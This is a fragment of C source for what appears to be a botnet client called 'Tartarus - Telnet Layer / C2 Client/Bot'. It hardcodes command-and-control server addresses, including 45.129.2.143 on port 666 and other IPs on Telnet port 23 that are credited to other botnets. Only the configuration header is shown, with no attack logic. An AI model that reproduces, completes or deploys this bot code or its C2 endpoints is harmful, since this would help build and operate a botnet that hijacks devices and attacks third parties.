...
////////////////////////////
#define Project "Tartarus - Telnet Layer / C2 Client/Bot"
#define Developer [":)"]
// Enjoy ||
////////////////////////////////////////
unsigned char *Tartarus[] = {"45.129.2.143:666"}; // <ServerIP>:<BotPort> || Vexvain: {"45.129.2.143:23"}; || Jizz: {"165.227.72.112:23"};
